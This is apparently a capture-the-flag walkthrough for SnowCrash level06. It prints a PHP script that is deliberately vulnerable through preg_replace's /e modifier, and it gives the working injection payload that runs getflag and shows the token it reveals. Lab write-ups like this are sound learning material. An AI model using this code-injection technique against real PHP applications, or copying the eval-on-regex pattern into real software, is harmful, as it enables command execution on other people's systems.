
in this level we got 2 files
--------------------------------
level06@SnowCrash:~$ ls
level06  level06.php
--------------------------------

let's cat the level06.php
--------------------------------
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
--------------------------------

after aanalysing the code we got that it has 2 functions y, x

the x function has an evaluation regex on the form of [x (something)] then pass the
argument "something" to the functions y(). Then it replace "." with x and "@" with y

then it treat the argument as a php code and print the result

so we need to create a file and put a string that respects the regex evaluation 
so we use the vulnerability to pass getflag as argument

first let's create  the file and put the tring inside it:
--------------------------------
level06@SnowCrash:~$ echo "[x \${\`getflag\`}]" > /tmp/text
--------------------------------

now let's pass the file as argument to level06:
--------------------------------
/level06 /tmp/text
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1

--------------------------------

Good! now let's get to the next level:
--------------------------------
level06@SnowCrash:~$ su level07
Password:
level07@SnowCrash:~$
--------------------------------
